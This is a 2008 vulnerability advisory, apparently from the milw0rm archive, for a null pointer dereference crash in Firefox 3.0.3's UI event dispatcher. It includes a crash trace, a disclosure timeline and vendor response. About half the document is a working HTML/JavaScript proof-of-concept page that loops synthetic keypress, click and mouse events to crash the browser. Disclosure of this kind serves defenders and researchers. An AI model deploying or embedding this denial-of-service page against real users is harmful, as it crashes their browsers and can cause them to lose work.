@@ -1,0 +1,118 @@
+==========================================================================
+
+Mozilla Firefox User Interface Null Pointer Dereference Dispatcher Crash
+and Remote Denial of Service.
+
+*Version Tested:*
+Mozilla 3.0.3 - 1.9.0 Branch /(Specifically for Latest Version)/
+
+*Severity:*
+High
+
+*Description:*
+The mozilla firefox is vulnerable to user interface event dispatcher null
+pointer dereference denial of service attacks. The dispatched event created
+dynamically leads to firefox crash when it is called directly or in a
+defined l
+oop with number of generated  user interface events.The resultant crash
+results in:
+
+Exception Type: EXC_BAD_ACCESS (SIGBUS)
+Exception Codes: KERN_PROTECTION_FAILURE at 0x0000000000000007
+Crashed Thread: 0
+Thread 0 Crashed: 0 libxpcom_core.dylib nsTArray_base::Length() const + 11
+(nsTArray.h:66)
+1 libgklayout.dylib
+nsContentUtils::GetAccelKeyCandidates(nsIDOMEvent*,
+nsTArray&) + 261 (nsContentUtils.cpp:4083)
+
+This security issue is a result of unhandled exception which is a result
+of null
+pointer dereference.
+
+*Links:*
+http://www.secniche.org/advisory.html
+http://evilfingers.com/advisory/index.php
+
+*Proof of Concept
+http://www.secniche.org/moz303/index.html
+*
+*Detection:*
+SecNiche confirmed this vulnerability affects  Mozilla Firefox
+on Microsoft Windows XP SP2 platform.The versions tested are:
+
+Mozilla 3.0.3 - 1.9.0 Branch
+
+*Disclosure Timeline:*
+Disclosed: 28 September 2008
+Release Date. 28 September ,2008
+
+*Vendor Response:*
+Mozilla confirm this vulnerability.
+*
+ Credit:*
+Aditya K Sood
+
+*Disclaimer*
+The information in the advisory is believed to be accurate at the time
+of publishing based
+on currently available information. Use of the information constitutes
+acceptance for use
+ in an AS IS condition. There is no representation or warranties, either
+express or implied
+by or with respect to anything in this document, and shall not be liable
+for a ny implied
+warranties of merchantability or fitness for a particular purpose or for
+any indirect special
+or consequential damages.
+
+==========================================================================
+
+<html>
+<title>Mozilla Firefox User Interface Dispatcher Crash and Remote Denial of Service</title>
+<head>
+
+
+<script language = "JavaScript">
+var moz303 = document.createEvent("UIEvents");
+
+moz303.initUIEvent("keypress", true, true, this, 1);
+for (var moz303_loop = 1 ; moz303_loop < 10 ; moz303_loop++)
+{
+        document.documentElement.dispatchEvent(moz303);
+}
+
+
+moz303.initUIEvent("click", true, true, this, 1);
+for (var moz303_loop = 1 ; moz303_loop < 10 ; moz303_loop++)
+{
+        document.documentElement.dispatchEvent(moz303);
+}
+
+moz303.initUIEvent("onkeydown", true, true, this, 1);
+for (var moz303_loop = 1 ; moz303_loop < 10 ; moz303_loop++)
+{
+        document.documentElement.dispatchEvent(moz303);
+}
+
+moz303.initUIEvent("onkeyup", true, true, this, 1);
+for (var moz303_loop = 1 ; moz303_loop < 10 ; moz303_loop++)
+{
+        document.documentElement.dispatchEvent(moz303);
+}
+
+moz303.initUIEvent("onmousedown", true, true, this, 1);
+for (var moz303_loop = 1 ; moz303_loop < 10 ; moz303_loop++)
+{
+        document.documentElement.dispatchEvent(moz303);
+}
+
+moz303.initUIEvent("onmouseup", true, true, this, 1);
+for (var moz303_loop = 1 ; moz303_loop < 10 ; moz303_loop++)
+{
+        document.documentElement.dispatchEvent(moz303);
+}
+
+</script>
+
+# milw0rm.com [2008-09-28]
